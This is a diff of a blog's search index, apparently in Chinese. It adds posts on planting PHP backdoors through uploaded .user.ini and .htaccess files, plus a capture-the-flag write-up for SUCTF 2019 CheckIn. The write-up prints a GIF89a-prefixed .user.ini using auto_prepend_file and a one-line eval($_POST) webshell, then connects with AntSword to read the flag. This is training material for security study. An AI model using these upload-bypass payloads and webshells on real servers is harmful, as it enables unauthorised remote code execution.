@@ -4,6 +4,63 @@
   
     
     <entry>
+      <title>Web:.htaccess文件上传后门</title>
+      <link href="2021/06/16/web.htaccess-wen-jian-shang-chuan-hou-men/"/>
+      <url>2021/06/16/web.htaccess-wen-jian-shang-chuan-hou-men/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞利用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web:.user.ini文件上传后门</title>
+      <link href="2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/"/>
+      <url>2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/</url>
+      
+        <content type="html"><![CDATA[<p>.user.ini比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法</p><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>那么什么是.user.ini？</p><p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code></p><p><img src="/2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/image-20210616122024800.png" alt="image-20210616122024800"></p><p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p><p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p><p><img src="/2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/image-20210616122046860.png" alt="image-20210616122046860"></p><p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p><p><img src="/2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/image-20210616122108740.png" alt="image-20210616122108740"></p><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><pre><code>auto_prepend_file=01.gif</code></pre><p>01.gif是要包含的文件。</p><p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p><p>原文<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞利用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SUCTF:2019-CheckIn</title>
+      <link href="2021/06/15/suctf-2019-checkin/"/>
+      <url>2021/06/15/suctf-2019-checkin/</url>
+      
+        <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn">https://buuoj.cn/challenges#[SUCTF%202019]CheckIn</a></p><h2 id="user-ini文件上传后门"><a href="#user-ini文件上传后门" class="headerlink" title=".user.ini文件上传后门"></a>.user.ini文件上传后门</h2><p>可以看“Web:.user.ini文件上传后门”</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="SUCTF:2019-CheckIn"></a>SUCTF:2019-CheckIn</h2><pre><code>&lt;?phpif (exif_imagetype("image.gif") != IMAGETYPE_GIF) {    echo "The picture is not a gif";}?&gt;if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {echo "File is not an image";return; }</code></pre><p><img src="/2021/06/15/suctf-2019-checkin/image-20210616120647894.png" alt="image-20210616120647894"></p><p>过滤了&lt;?</p><p>user.ini文件形成后门原理就是会在执行所有的php文件之前包含.user.ini所指定的文件</p><p>所以我们构造  ini文件内容为  auto_prepend_file=1.jpg</p><pre><code>GIF89aauto_prepend_file=1.jpg</code></pre><p>过滤了&lt;?，进行了文件头的检测，加一个GIF89a</p><pre><code>GIF89a&lt;script language=php&gt; @eval($_POST[1])&lt;/script&gt;</code></pre><p>Your dir uploads/365c7675ba6b8855fe632bc4420ce021<br>Your files :<br>array(5) { [0]=&gt; string(1) “.” [1]=&gt; string(2) “..” [2]=&gt; string(9) “.user.ini” [3]=&gt; string(5) “1.jpg” [4]=&gt; string(9) “index.php” }</p><p>上传蚁剑连接：</p><pre><code>url/uploads/365c7675ba6b8855fe632bc4420ce021/index.php</code></pre><p>虚拟终端执行命令  cat/flag</p><p><img src="/2021/06/15/suctf-2019-checkin/image-20210616121058497.png" alt="image-20210616121058497"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Web:PHP弱类型</title>
       <link href="2021/06/14/web-php-ruo-lei-xing/"/>
       <url>2021/06/14/web-php-ruo-lei-xing/</url>
